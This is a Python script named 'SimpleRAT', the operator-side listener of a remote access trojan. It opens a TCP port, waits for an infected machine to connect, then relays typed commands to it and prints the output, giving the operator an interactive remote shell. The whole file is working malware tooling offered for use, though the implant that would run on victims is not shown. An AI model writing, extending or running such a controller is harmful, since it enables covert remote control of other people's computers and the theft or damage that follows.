#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import os
import sys
import argparse
import random
from colorama import Fore
import time

def c():
	clear = lambda:os.system('cls' if os.name == 'nt' else 'clear')
	clear()
	print('''
   _____            __    ___  ___ ______
  / __(_)_ _  ___  / /__ / _ \/ _ /_  __/
 _\ \/ /  ' \/ _ \/ / -_) , _/ __ |/ /
/___/_/_/_/_/ .__/_/\__/_/|_/_/ |_/_/
           /_/
''')

yellow = Fore.YELLOW
red = Fore.RED
reset = Fore.RESET

def arguments():
	parser = argparse.ArgumentParser(prog='SimpleRAT', description = 'http://github.com/jc-sec')
	parser.add_argument('-p', '--port', help='Choose a port to listen!', type=int)
	args = parser.parse_args()
	return args
def connection(p):
	if p == None:
		try:
			p = random.randint(1, 65535)
		except OSError:
			p()
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind(('0.0.0.0', p))
		s.listen(1)
		c()
		print(yellow,'[!] Waiting for connections. port:', p)
		con, ip = s.accept()
		print(reset,'[+] Connection with %s received!' %(ip[0]))
	except OSError:
		print(red,'[-] Try other port')
		exit()
	try:
		while True:
			msg = str(input('\n~> '))
			if msg == 'exit':
				msg = 'Exiting...'
				msg = msg.encode()
				con.send(msg)
				con.close()
				exit()
			else:
				msg = msg.encode()
				con.send(msg)
				recv = con.recv(1024*3)
				recv = recv.decode()
				print(recv)
	except BrokenPipeError:
		print(red, '[-] Disconnected')
	except KeyboardInterrupt:
		print(red,'\nexiting the session...')
		msg = 'Exiting...'
		msg = msg.encode()
		con.send(msg)
		con.close()
		exit()
def main():
	args = arguments()
	connection(args.port)
if __name__ == '__main__':
	main()
